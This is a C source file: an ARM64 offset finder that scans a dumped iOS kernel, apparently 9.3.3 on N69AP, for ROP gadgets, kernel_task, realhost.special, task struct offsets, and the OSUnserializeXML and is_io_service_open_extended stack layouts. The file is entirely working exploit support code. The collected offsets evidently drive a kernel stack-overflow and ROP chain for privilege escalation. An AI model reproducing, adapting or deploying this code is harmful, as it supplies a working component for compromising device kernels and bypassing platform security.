#include <errno.h>              // errno
#include <stdlib.h>             // malloc
#include <string.h>             // strcmp, strlen, strerror, memcmp, memcpy

#include "common.h"             // DEBUG, addr_t, mach_*

#include "find.h"

// Disclaimer:

// I put this offset finder together as I went along. I don't know how well this
// actually works on kernels other than the N69AP/9.3.3 one, and I have no idea
// how reliably my methods of identifying stuff really are, or if any of them
// are likely to be different in future/past kernels.

// imm = register plus immediate, lit = PC-relative literal

#ifdef __LP64__
#   define IS_RET(instr) ((instr) == 0xd65f03c0)
#   define IS_BL(instr) (((instr) & 0xfc000000) == 0x94000000)
#   define LDR_IMM(instr) (((instr) >> 7) & 0x7ff8)
// for all *_LIT: 26-bit sign extend and multiply by 4
#   define LDR_LIT(instr) ((((int64_t)(instr) & 0xffffe0) << 40) >> 43)
#   define BL_LIT(instr) ((((int64_t)(instr) & 0x3ffffff) << 38) >> 36)
#   define ADR_LIT(instr) (((((int64_t)(instr) & 0xffffe0) << 40) >> 43) | (((instr) >> 29) & 3))
#   define ADRP_LIT(instr) (ADR_LIT(instr) << 12)
#else
// TODO?
#endif

typedef struct
{
    addr_t addr;
    size_t len;
    void *buf;
    char *name;
} segment_t;

#ifdef __LP64__

typedef struct
{
    int num_args;
    addr_t handler;
    addr_t munger;
    int num_u32;
} mach_trap_t;

typedef struct
{
    addr_t handler;
    addr_t stub;
    uint32_t num_args;
    uint32_t num_descr;
    addr_t descr_arr;
    uint32_t reply_size;
} mig_routine_descriptor_t;

// Convention:
// *find* functions return virtual memory addresses
// *get* functions return pointers

static segment_t* vmem_segment(segment_t *segs, size_t numsegs, addr_t addr)
{
    for(size_t i = 0; i < numsegs; ++i)
    {
        if(segs[i].addr <= addr && segs[i].addr + segs[i].len > addr)
        {
            return &segs[i];
        }
    }
    THROW("vmem address out of range: " ADDR, addr);
}

static void* vmem_to_ptr(segment_t *segs, size_t numsegs, addr_t addr)
{
    segment_t *seg = vmem_segment(segs, numsegs, addr);
    return &((char*)seg->buf)[addr - seg->addr];
}

static segment_t* ptr_segment(segment_t *segs, size_t numsegs, void *ptr)
{
    for(size_t i = 0; i < numsegs; ++i)
    {
        if((char*)segs[i].buf <= (char*)ptr && &((char*)segs[i].buf)[segs[i].len] > (char*)ptr)
        {
            return &segs[i];
        }
    }
    THROW("pointer out of range: " ADDR, (addr_t)ptr);
}

static addr_t ptr_to_vmem(segment_t *segs, size_t numsegs, void *ptr)
{
    segment_t *seg = ptr_segment(segs, numsegs, ptr);
    return seg->addr + ((char*)ptr - (char*)seg->buf);
}

static segment_t* get_segment(segment_t *segs, size_t numsegs, char *name)
{
    for(size_t i = 0; i < numsegs; ++i)
    {
        if(strcmp(segs[i].name, name) == 0)
        {
            return &segs[i];
        }
    }
    THROW("Failed to find %s segment", name);
}

static addr_t vmem_find_bytes(segment_t *segs, size_t numsegs, void *search, size_t len, size_t granularity, char *name)
{
    for(size_t i = 0; i < numsegs; ++i)
    {
        for(size_t off = 0; off <= segs[i].len - len; off += granularity)
        {
            if(memcmp(&((char*)segs[i].buf)[off], search, len) == 0)
            {
                return segs[i].addr + off;
            }
        }
    }
    THROW("Failed to vmem_find_bytes: %s", name);
}

static addr_t vmem_find_str(segment_t *segs, size_t numsegs, char *str)
{
    return vmem_find_bytes(segs, numsegs, str, strlen(str) + 1, 1, str);
}

static mach_trap_t* get_mach_trap_table(segment_t *segs, size_t numsegs)
{
    DEBUG("Looking for mach_trap_table...");

    segment_t *data = get_segment(segs, numsegs, "__DATA");
    char *buf = data->buf;
    // Size of 50 mach traps should be enough
    for(size_t off = 0; off <= data->len - 50 * sizeof(mach_trap_t); off += sizeof(addr_t))
    {
        mach_trap_t *trap = (mach_trap_t*)&buf[off];
        if(trap[0].num_args == 0 && trap[0].munger == 0 && trap[0].num_u32 == 0 && (trap[0].handler & 0xffffff8000000000) == 0xffffff8000000000)
        {
            for(size_t i = 1; i <= 9; ++i)
            {
                if(memcmp(&trap[0], &trap[i], sizeof(mach_trap_t)) != 0)
                {
                    goto next; // because labelled continue is not a thing
                }
            }

            DEBUG("Found mach_trap_table at " ADDR, ptr_to_vmem(data, 1, trap));
            return trap;
            next:;
        }
    }
    THROW("Failed to find mach_trap_table");
}

static void parse_task_for_pid(segment_t *segs, size_t numsegs, segment_t **segptr, uint32_t **ptrptr)
{
    static bool initialized = false;
    static segment_t *seg = NULL;
    static uint32_t  *ptr = NULL;

    if(!initialized)
    {
        DEBUG("Looking for task_for_pid...");

        addr_t addr = get_mach_trap_table(segs, numsegs)[45].handler;
        seg = vmem_segment(segs, numsegs, addr);
        uint32_t *tfp = vmem_to_ptr(seg, 1, addr),
                 *end;
        DEBUG("Found task_for_pid at " ADDR ", parsing it now...", addr);
        for(end = tfp; end < (uint32_t*)&((char*)seg->buf)[seg->len]; ++end)
        {
            if(IS_RET(*end))
            {
                goto found_end;
            }
        }
        THROW("Failed to find end of task_for_pid");

        found_end:;
        DEBUG("Found end of task_for_pid at " ADDR, ptr_to_vmem(seg, 1, end));
        for(ptr = tfp; ptr < end; ++ptr)
        {
            if
            (
                ((ptr[0] & 0xffffffe0) == 0xd538d080) && // mrs Xn, tpidr_el1
                ((ptr[1] & 0xffc003e0) == (0xf9400000 | ((ptr[0] & 0x1f) << 5))) && // ldr Xm, [Xn, *]
                ((ptr[2] & 0xffc003ff) == (0xf9400001 | ((ptr[1] & 0x1f) << 5))) // ldr X1, [Xm, *]
            )
            {
                goto found_sequence;
            }
        }
        THROW("Failed to find tpidr_el1 to x1 sequence in task_for_pid");

        found_sequence:;
        DEBUG("Found tpidr_el1 to x1 sequence at " ADDR, ptr_to_vmem(seg, 1, ptr));
        initialized = true;
    }

    *segptr = seg;
    *ptrptr = ptr;
}

static addr_t find_ipc_port_copyout_send(segment_t *segs, size_t numsegs)
{
    DEBUG("Looking for ipc_port_copyout_send...");

    segment_t *seg = NULL;
    uint32_t  *ptr = NULL;
    parse_task_for_pid(segs, numsegs, &seg, &ptr);

    if(IS_BL(ptr[3]))
    {
        int64_t off = BL_LIT(ptr[3]);
        addr_t ret = ptr_to_vmem(seg, 1, &ptr[3]) + off;
        DEBUG("Found ipc_port_copyout_send at " ADDR, ret);
        return ret;
    }

    THROW("Failed to find bl sym._ipc_port_copyout_send in task_for_pid");
}

static addr_t find_task_itk_space(segment_t *segs, size_t numsegs)
{
    DEBUG("Looking for task->itk_space offset...");

    segment_t *seg = NULL;
    uint32_t  *ptr = NULL;
    parse_task_for_pid(segs, numsegs, &seg, &ptr);

    addr_t ret = LDR_IMM(ptr[2]);
    DEBUG("Determined offset to be " ADDR, ret);
    return ret;
}

static void parse_ipc_port_copyout_send(segment_t *segs, size_t numsegs, segment_t **segptr, uint32_t **bl1ptr, uint32_t **bl2ptr)
{
    static bool initialized = false;
    static uint32_t *bls[2]; // addresses of the first two bl's
    static segment_t *seg = NULL;

    if(!initialized)
    {
        DEBUG("Looking for ipc_port_copyout_send...");

        uint32_t  *tfp = NULL;
        parse_task_for_pid(segs, numsegs, &seg, &tfp);

        if(IS_BL(tfp[-1]))
        {
            uint32_t *copyout = (uint32_t*)&((char*)&tfp[-1])[BL_LIT(tfp[-1])],
                     *copyout_end;
            DEBUG("Found ipc_port_copyout_send at " ADDR ", parsing it now...", ptr_to_vmem(seg, 1, copyout));

            for(copyout_end = copyout; copyout_end < (uint32_t*)&((char*)seg->buf)[seg->len]; ++copyout_end)
            {
                if(IS_RET(*copyout_end))
                {
                    goto found_end;
                }
            }
            THROW("Failed to find end of ipc_port_copyout_send");

            found_end:;
            DEBUG("Found end of ipc_port_copyout_send at " ADDR, ptr_to_vmem(seg, 1, copyout_end));

            // Make sure we've got 4 bl's
            size_t numbl = 0;
            for(uint32_t *ptr = copyout; ptr < copyout_end; ++ptr)
            {
                if(IS_BL(*ptr))
                {
                    if(numbl <= 1)
                    {
                        bls[numbl] = ptr;
                    }
                    ++numbl;
                }
            }
            if(numbl != 4)
            {
                THROW("ipc_port_copyout_send doesn't have 4 bl's");
            }

            DEBUG("Found first two bl's at " ADDR "and" ADDR, ptr_to_vmem(seg, 1, bls[0]), ptr_to_vmem(seg, 1, bls[1]));
            initialized = true;
        }
        else
        {
            THROW("Failed to find bl sym._ipc_port_copyout_send in task_for_pid");
        }
    }

    *bl1ptr = bls[0];
    *bl2ptr = bls[1];
    *segptr = seg;
}

static addr_t find_ipc_port_make_send(segment_t *segs, size_t numsegs)
{
    DEBUG("Looking for ipc_port_make_send...");

    segment_t *seg;
    uint32_t *bl1 = NULL,
             *bl2 = NULL;
    parse_ipc_port_copyout_send(segs, numsegs, &seg, &bl1, &bl2);

    addr_t ret = ptr_to_vmem(seg, 1, bl2) + BL_LIT(*bl2);
    DEBUG("Found ipc_port_make_send at " ADDR, ret);
    return ret;
}

static addr_t find_task_itk_self(segment_t *segs, size_t numsegs)
{
    DEBUG("Looking for task->itk_self offset...");

    segment_t *seg;
    uint32_t *bl1 = NULL,
             *bl2 = NULL;
    parse_ipc_port_copyout_send(segs, numsegs, &seg, &bl1, &bl2);

    for(uint32_t *ptr = bl2 - 1; ptr > bl1; --ptr)
    {
        if((*ptr & 0xffc0001f) == 0xf9400000) // ldr X0, ...
        {
            addr_t ret = LDR_IMM(*ptr);
            DEBUG("Determined offset to be " ADDR, ret);
            return ret;
        }
    }

    THROW("Failed to find ldr X0, ... between the first two bl's in ipc_port_copyout_send");
}

static addr_t find_kernel_task(segment_t *segs, size_t numsegs)
{
    DEBUG("Looking for kernel_task...");

    addr_t panic_info = vmem_find_str(segs, numsegs, "aapl,panic-info");
    segment_t *text = get_segment(segs, numsegs, "__TEXT");

    for(uint32_t *ptr = text->buf, *end = (uint32_t*)&((char*)ptr)[text->len]; ptr < end; ++ptr)
    {
        if((*ptr & 0x9f000000) == 0x10000000) // adr
        {
            addr_t pc = ptr_to_vmem(text, 1, ptr);
            if(pc + ADR_LIT(*ptr) == panic_info) // adr Xn, "aapl,panic-info"
            {
                DEBUG("Found reference to \"aapl,panic-info\" at " ADDR, pc);
                for(uint32_t *p = ptr - 1; p >= (uint32_t*)text->buf; --p)
                {
                    if((*p & 0xffffffe0) == 0xd538d080) // mrs Xn, tpidr_el1
                    {
                        DEBUG("Last reference to tpidr_el1 before that is at " ADDR, ptr_to_vmem(text, 1, p));

                        size_t num_ldrs = 0;
                        uint32_t *last = NULL;
                        for(++p; p < ptr; ++p)
                        {
                            if((*p & 0xff000000) == 0x58000000) // ldr with PC-relative offset
                            {
                                last = p;
                                ++num_ldrs;
                            }
                        }

                        if(num_ldrs == 1)
                        {
                            addr_t ret = ptr_to_vmem(text, 1, last) + LDR_LIT(*last);
                            DEBUG("Found kernel_task at " ADDR, ret);
                            return ret;
                        }
                        DEBUG("Number of PC-relative ldr's between tpidr_el1 and panic-ref is != 1");
                        goto next; // "break" would trigger the message below
                    }
                }
                DEBUG("But found no reference to tpidr_el1 before that, looking for next reference to \"aapl,panic-info\"...");
                next:;
            }
        }
    }

    THROW("Failed to find kernel_task");
}

static addr_t find_realhost_special(segment_t *segs, size_t numsegs)
{
    DEBUG("Looking for realhost.special...");

    segment_t *data = get_segment(segs, numsegs, "__DATA");
    for(uint64_t *host_priv = data->buf, *host_priv_end = (uint64_t*)&((char*)host_priv)[data->len - 26 * sizeof(mig_routine_descriptor_t)]; host_priv < host_priv_end; ++host_priv)
    {
        uint32_t *u = (uint32_t*)host_priv;
        if(u[0] == 400 && u[1] == 426 && host_priv[2] == 0) // u vs host_priv is intentional
        {
            mig_routine_descriptor_t *table = (mig_routine_descriptor_t*)&host_priv[3];
            uint32_t *_Xhost_get_special_port = vmem_to_ptr(segs, numsegs, table[12].stub),
                     *_Xhost_get_special_port_end = _Xhost_get_special_port;
            for(segment_t *seg = ptr_segment(segs, numsegs, _Xhost_get_special_port); _Xhost_get_special_port_end < (uint32_t*)&((char*)seg->buf)[seg->len]; ++_Xhost_get_special_port_end)
            {
                if(IS_RET(*_Xhost_get_special_port_end))
                {
                    goto found_Xend;
                }
            }
            THROW("Failed to find end of _Xhost_get_special_port");

            found_Xend:;
            DEBUG("Found end of _Xhost_get_special_port at " ADDR, ptr_to_vmem(segs, numsegs, _Xhost_get_special_port_end));
            for(--_Xhost_get_special_port_end; _Xhost_get_special_port_end > _Xhost_get_special_port; --_Xhost_get_special_port_end)
            {
                if(IS_BL(*_Xhost_get_special_port_end))
                {
                    goto found_bl;
                }
            }
            THROW("Failed to find bl to host_get_special_port");

            found_bl:;
            DEBUG("Found bl to host_get_special_port at " ADDR, ptr_to_vmem(segs, numsegs, _Xhost_get_special_port_end));
            uint32_t *host_get_special_port = vmem_to_ptr(segs, numsegs, ptr_to_vmem(segs, numsegs, _Xhost_get_special_port_end) + BL_LIT(*_Xhost_get_special_port_end)),
                     *host_get_special_port_end = host_get_special_port;
            for(segment_t *seg = ptr_segment(segs, numsegs, host_get_special_port); host_get_special_port_end < (uint32_t*)&((char*)seg->buf)[seg->len]; ++host_get_special_port_end)
            {
                if(IS_RET(*host_get_special_port_end))
                {
                    goto found_end;
                }
            }
            THROW("Failed to find end of host_get_special_port");

            found_end:;
            DEBUG("Found end of host_get_special_port at " ADDR, ptr_to_vmem(segs, numsegs, host_get_special_port_end));
            for(; host_get_special_port < host_get_special_port_end - 3; ++host_get_special_port)
            {
                if(IS_BL(host_get_special_port[0]))
                {
                    DEBUG("Found bl in host_get_special_port at " ADDR, ptr_to_vmem(segs, numsegs, host_get_special_port));
                    if
                    (
                        (host_get_special_port[1] & 0x9f000000) == 0x90000000 && // adrp
                        (host_get_special_port[2] & 0xffc00000) == 0x91000000 && // add with unshifted immediate
                        (host_get_special_port[3] & 0xffe00000) == 0x8b200000 && // add extended register
                        (host_get_special_port[4] & 0xffc00000) == 0xf9400000 && // ldr with immediate
                        (host_get_special_port[1] & 0x1f) == ((host_get_special_port[2] >> 5) & 0x1f) && // adrp dst is add src
                        (host_get_special_port[2] & 0x1f) == ((host_get_special_port[3] >> 5) & 0x1f) && // add dst is addsr src
                        (host_get_special_port[3] & 0x1f) == ((host_get_special_port[4] >> 5) & 0x1f)    // addsr dst is ldr src
                    )
                    {
                        addr_t ret = (ptr_to_vmem(segs, numsegs, &host_get_special_port[1]) & 0xfffffffffffff000) + ADRP_LIT(host_get_special_port[1]) + ((host_get_special_port[2] & 0x3ffc00) >> 10) + LDR_IMM(host_get_special_port[4]);
                        DEBUG("Found realhost.special at " ADDR, ret);
                        return ret;
                    }
                    THROW("Failed to find realhost.special");
                }
            }
            THROW("Failed to find bl in host_get_special_port");
        }
    }

    THROW("Failed to find host_priv subsystem");
}

static addr_t find_is_io_service_open_extended_stacksize(segment_t *segs, size_t numsegs)
{
    DEBUG("Looking for is_io_service_open_extended stack size...");

    addr_t IOUserClientCrossEndian = vmem_find_str(segs, numsegs, "IOUserClientCrossEndian");
    segment_t *text = get_segment(segs, numsegs, "__TEXT");

    for(uint32_t *ref = text->buf, *end = (uint32_t*)&((char*)ref)[text->len]; ref < end; ++ref)
    {
        if((*ref & 0x9f000000) == 0x10000000) // adr
        {
            addr_t pc = ptr_to_vmem(text, 1, ref);
            if(pc + ADR_LIT(*ref) == IOUserClientCrossEndian) // adr Xn, "IOUserClientCrossEndian"
            {
                DEBUG("Found reference to \"IOUserClientCrossEndian\" at " ADDR, pc);
                uint32_t *ptr = ref - 1;
                for(; ptr >= (uint32_t*)text->buf; --ptr)
                {
                    if(IS_RET(*ptr))
                    {
                        ++ptr;
                        goto found_start;
                    }
                }
                THROW("Failed to find start of is_io_service_open_extended");

                found_start:;
                DEBUG("Found start of is_io_service_open_extended at " ADDR, ptr_to_vmem(text, 1, ptr));
                addr_t off = 0;
                for(; ptr < ref; ++ptr)
                {
                    if((*ptr & 0xffc003e0) == 0xa98003e0) // stp Xn, Xm, [sp, 0x???]!
                    {
                        int64_t imm = ((((int64_t)*ptr) & 0x3f8000) << 42) >> 54;
                        off += -imm;
                        goto found_stp;
                    }
                }
                THROW("Failed to find pre-indexing stp in is_io_service_open_extended");

                found_stp:;
                DEBUG("Found stp in is_io_service_open_extended at " ADDR " with offset 0x%llx", ptr_to_vmem(text, 1, ptr), off);
                for(++ptr; ptr < ref; ++ptr)
                {
                    if((*ptr & 0xffc003ff) == 0xd10003ff) // sub sp, sp, 0x???
                    {
                        uint64_t imm = (*ptr & 0x3ffc00) >> 10;
                        DEBUG("Found sub sp, sp in is_io_service_open_extended at " ADDR " with offset 0x%llx", ptr_to_vmem(text, 1, ptr), imm);
                        off += imm;
                        DEBUG("Determined is_io_service_open_extended stack size to be 0x%llx", off);
                        return off;
                    }
                }
                THROW("Failed to find sub sp, sp in is_io_service_open_extended");
            }
        }
    }

    THROW("Failed to find reference to IOUserClientCrossEndian");
}

static void parse_OSUnserializeXML(segment_t *segs, size_t numsegs, uint32_t **startptr, uint32_t **endptr)
{
    static bool initialized = false;
    static uint32_t *start = NULL,
                    *end   = NULL;

    if(!initialized)
    {
        DEBUG("Looking for OSUnserializeXML...");

        addr_t straddr = vmem_find_str(segs, numsegs, "OSSerializeBinary.cpp");
        segment_t *strseg = vmem_segment(segs, numsegs, straddr);
        char *str = vmem_to_ptr(strseg, 1, straddr);
        for(; str >= (char*)strseg->buf; --str)
        {
            if(*str == '\0')
            {
                ++str;
                goto found_str;
            }
        }
        THROW("Failed to find start of string containing \"OSSerializeBinary.cpp\"");

        found_str:;
        DEBUG("Found string: %s", str);
        straddr = ptr_to_vmem(strseg, 1, str);

        segment_t *text = get_segment(segs, numsegs, "__TEXT");
        for(start = text->buf; start < (uint32_t*)&((char*)text->buf)[text->len]; ++start)
        {
            if((*start & 0x9f000000) == 0x10000000) // adr
            {
                addr_t pc = ptr_to_vmem(text, 1, start);
                if(pc + ADR_LIT(*start) == straddr) // adr Xn, "OSSerializeBinary.cpp"
                {
                    DEBUG("Found reference to string at " ADDR, pc);
                    goto found_ref;
                }
            }
        }
        THROW("Failed to find reference to string containing \"OSSerializeBinary.cpp\"");

        found_ref:;
        for(end = start + 1; end < (uint32_t*)&((char*)text->buf)[text->len]; ++end)
        {
            if(IS_RET(*end))
            {
                goto found_end;
            }
        }
        THROW("Failed to find end of OSUnserializeXML");

        found_end:;
        DEBUG("Found end of OSUnserializeXML at " ADDR, ptr_to_vmem(text, 1, end));
        for(--start; start >= (uint32_t*)text->buf; --start)
        {
            if((*start & 0xffc003e0) == 0xa98003e0) // stp Xn, Xm, [sp, 0x???]!
            {
                goto found_start;
            }
        }
        THROW("Failed to find start of OSUnserializeXML");

        found_start:;
        DEBUG("Found start of OSUnserializeXML at " ADDR, ptr_to_vmem(text, 1, start));

        initialized = true;
    }

    *startptr = start;
    *endptr   = end;
}

static addr_t find_OSUnserializeXML_stacksize(segment_t *segs, size_t numsegs)
{
    DEBUG("Looking for OSUnserializeXML stack size...");

    uint32_t *start = NULL,
             *end   = NULL;
    parse_OSUnserializeXML(segs, numsegs, &start, &end);

    int64_t imm = ((((int64_t)*start) & 0x3f8000) << 42) >> 54;
    addr_t off = -imm;
    DEBUG("Found stp in OSUnserializeXML with offset 0x%llx", off);

    for(++start; start < end; ++start)
    {
        if((*start & 0xffc003ff) == 0xd10003ff) // sub sp, sp, 0x???
        {
            off += (*start & 0x3ffc00) >> 10;
            DEBUG("Determined OSUnserializeXML stack size to be 0x%llx", off);
            return off;
        }
    }

    THROW("Failed to find sub sp, sp in OSUnserializeXML");
}

static addr_t find_OSUnserializeXML_return(segment_t *segs, size_t numsegs)
{
    DEBUG("Looking for OSUnserializeXML return address...");

    uint32_t *start = NULL,
             *end   = NULL;
    parse_OSUnserializeXML(segs, numsegs, &start, &end);

    for(--end; end > start; --end)
    {
        if
        (
            (end[0] & 0xffffffe0) == 0xd2800000 && // movz Xn, 0
            (end[1] & 0xffe0ffff) == 0xaa0003e0 && // mov X0, Xm
            (end[0] & 0x1f) == ((end[1] & 0x1f0000) >> 16) // n == m
        )
        {
            addr_t ret = ptr_to_vmem(segs, numsegs, end);
            DEBUG("Found OSUnserializeXML return address at " ADDR, ret);
            return ret;
        }
    }

    THROW("Failed to find OSUnserializeXML return address");
}

#endif

// delta is base address of current kernel minus dumped kernel (so it can be negative)
void find_all_offsets(file_t *kernel, int64_t delta, offsets_t *off)
{
    DEBUG("Looking for offsets in kernel...");

    mach_hdr_t *hdr = (mach_hdr_t*)kernel->buf;
    size_t numsegs = 0;
    for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
    {
        switch(cmd->cmd)
        {
            case LC_SEGMENT:
            case LC_SEGMENT_64:
                {
                    ++numsegs;
                }
            default:
                break;
        }
    }

    segment_t seg_exec[2] =
    {
        { .addr = 0, .len = 0, .buf = NULL },
        { .addr = 0, .len = 0, .buf = NULL },
    };
    segment_t *segments = malloc(sizeof(segment_t) * numsegs);
    if(segments == NULL)
    {
        THROW("Failed to allocate segments array (%s)", strerror(errno));
    }
    TRY
    ({
        size_t i = 0;
        for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
        {
            switch(cmd->cmd)
            {
                case LC_SEGMENT:
                case LC_SEGMENT_64:
                    {
                        mach_seg_t *seg = (mach_seg_t*)cmd;
                        segments[i].addr = seg->vmaddr;
                        segments[i].len = seg->filesize;
                        segments[i].buf = &kernel->buf[seg->fileoff];
                        segments[i].name = seg->segname;
                        if(strcmp(seg->segname, "__TEXT") == 0)
                        {
                            memcpy(&seg_exec[0], &segments[i], sizeof(segment_t));
                        }
                        else if(strcmp(seg->segname, "__PRELINK_TEXT") == 0)
                        {
                            memcpy(&seg_exec[1], &segments[i], sizeof(segment_t));
                        }
                        ++i;
                    }
                default:
                    break;
            }
        }
        if(seg_exec[0].buf == NULL)
        {
            THROW("Failed to locate __TEXT segment");
        }
        if(seg_exec[1].buf == NULL)
        {
            THROW("Failed to locate __PRELINK_TEXT segment");
        }

#ifdef __LP64__

        uint32_t gadget_load_x20_x19[] =
        {
            0xa9417bfd, // ldp x29, x30, [sp, 0x10]
            0xa8c24ff4, // ldp x20, x19, [sp], 0x20
            0xd65f03c0, // ret
        };
        off->slid.gadget_load_x20_x19 = vmem_find_bytes(seg_exec, 2, gadget_load_x20_x19, sizeof(gadget_load_x20_x19), 4, "gadget_load_x20_x19") + delta;

        uint32_t gadget_ldp_x9_add_sp_sp_0x10[] =
        {
            0xa8c1793d, // ldp x29, x30, [x9], 0x10
            0x910043ff, // add sp, sp, 0x10
            0xd65f03c0, // ret
        };
        off->slid.gadget_ldp_x9_add_sp_sp_0x10 = vmem_find_bytes(seg_exec, 2, gadget_ldp_x9_add_sp_sp_0x10, sizeof(gadget_ldp_x9_add_sp_sp_0x10), 4, "gadget_ldp_x9_add_sp_sp_0x10") + delta;

        uint32_t gadget_ldr_x0_sp_0x20_load_x22_x19[] =
        {
            0xf94013e0, // ldr x0, [sp, 0x20]
            0xd10083bf, // sub sp, x29, 0x20
            0xa9427bfd, // ldp x29, x30, [sp, 0x20]
            0xa9414ff4, // ldp x20, x19, [sp, 0x10]
            0xa8c357f6, // ldp x22, x21, [sp], 0x30
            0xd65f03c0, // ret
        };
        off->slid.gadget_ldr_x0_sp_0x20_load_x22_x19 = vmem_find_bytes(seg_exec, 2, gadget_ldr_x0_sp_0x20_load_x22_x19, sizeof(gadget_ldr_x0_sp_0x20_load_x22_x19), 4, "gadget_ldr_x0_sp_0x20_load_x22_x19") + delta;

        uint32_t gadget_add_x0_x0_x19_load_x20_x19[] =
        {
            0x8b130000, // add x0, x0, x19
            0xa9417bfd, // ldp x29, x30, [sp, 0x10]
            0xa8c24ff4, // ldp x20, x19, [sp], 0x20
            0xd65f03c0, // ret
        };
        off->slid.gadget_add_x0_x0_x19_load_x20_x19 = vmem_find_bytes(seg_exec, 2, gadget_add_x0_x0_x19_load_x20_x19, sizeof(gadget_add_x0_x0_x19_load_x20_x19), 4, "gadget_add_x0_x0_x19_load_x20_x19") + delta;

        uint32_t gadget_blr_x20_load_x22_x19[] =
        {
            0xd63f0280, // blr x20
            0xd10083bf, // sub sp, x29, 0x20
            0xa9427bfd, // ldp x29, x30, [sp, 0x20]
            0xa9414ff4, // ldp x20, x19, [sp, 0x10]
            0xa8c357f6, // ldp x22, x21, [sp], 0x30
            0xd65f03c0, // ret
        };
        off->slid.gadget_blr_x20_load_x22_x19 = vmem_find_bytes(seg_exec, 2, gadget_blr_x20_load_x22_x19, sizeof(gadget_blr_x20_load_x22_x19), 4, "gadget_blr_x20_load_x22_x19") + delta;

        uint32_t gadget_str_x0_x19_load_x20_x19[] =
        {
            0xf9000260, // str x0, [x19]
            0xa9417bfd, // ldp x29, x30, [sp, 0x10]
            0xa8c24ff4, // ldp x20, x19, [sp], 0x20
            0xd65f03c0, // ret
        };
        off->slid.gadget_str_x0_x19_load_x20_x19 = vmem_find_bytes(seg_exec, 2, gadget_str_x0_x19_load_x20_x19, sizeof(gadget_str_x0_x19_load_x20_x19), 4, "gadget_str_x0_x19_load_x20_x19") + delta;

        uint32_t gadget_ldr_x0_x21_load_x24_x19[] =
        {
            0xf94002a0, // ldr x0, [x21]
            0xa9437bfd, // ldp x29, x30, [sp, 0x30]
            0xa9424ff4, // ldp x20, x19, [sp, 0x20]
            0xa94157f6, // ldp x22, x21, [sp, 0x10]
            0xa8c45ff8, // ldp x24, x23, [sp], 0x40
            0xd65f03c0, // ret
        };
        off->slid.gadget_ldr_x0_x21_load_x24_x19 = vmem_find_bytes(seg_exec, 2, gadget_ldr_x0_x21_load_x24_x19, sizeof(gadget_ldr_x0_x21_load_x24_x19), 4, "gadget_ldr_x0_x21_load_x24_x19") + delta;

        uint32_t frag_mov_x1_x20_blr_x19[] =
        {
            0xaa1403e1, // mov x1, x20
            0xd63f0260, // blr x19
        };
        off->slid.frag_mov_x1_x20_blr_x19 = vmem_find_bytes(seg_exec, 2, frag_mov_x1_x20_blr_x19, sizeof(frag_mov_x1_x20_blr_x19), 4, "frag_mov_x1_x20_blr_x19") + delta;

        uint32_t func_ldr_x0_x0[] =
        {
            0xf9400000, // ldr x0, [x0]
            0xd65f03c0, // ret
        };
        off->slid.func_ldr_x0_x0 = vmem_find_bytes(seg_exec, 2, func_ldr_x0_x0, sizeof(func_ldr_x0_x0), 4, "func_ldr_x0_x0") + delta;

        uint32_t func_current_task[] =
        {
            0xd538d088, // mrs x8, tpidr_el1
            0xf9418900, // ldr x0, [x8, 0x310]
            0xd65f03c0, // ret
        };
        off->slid.func_current_task = vmem_find_bytes(seg_exec, 2, func_current_task, sizeof(func_current_task), 4, "func_current_task") + delta;

        off->slid.func_ipc_port_copyout_send = find_ipc_port_copyout_send(segments, numsegs) + delta;
        off->unslid.off_task_itk_space       = find_task_itk_space(segments, numsegs); // no delta

        off->slid.func_ipc_port_make_send = find_ipc_port_make_send(segments, numsegs) + delta;
        off->unslid.off_task_itk_self     = find_task_itk_self(segments, numsegs); // no delta

        off->slid.data_kernel_task      = find_kernel_task(segments, numsegs) + delta;
        off->slid.data_realhost_special = find_realhost_special(segments, numsegs) + delta;

        off->unslid.is_io_service_open_extended_stack = find_is_io_service_open_extended_stacksize(segments, numsegs); // no delta
        off->unslid.OSUnserializeXML_stack            = find_OSUnserializeXML_stacksize(segments, numsegs); // no delta
        off->slid.gadget_OSUnserializeXML_return      = find_OSUnserializeXML_return(segments, numsegs) + delta;

        DEBUG("Got all offsets");
#else
        THROW("32-bit is not supported yet");
#endif
    })
    FINALLY
    ({
        free(segments);
    })
}
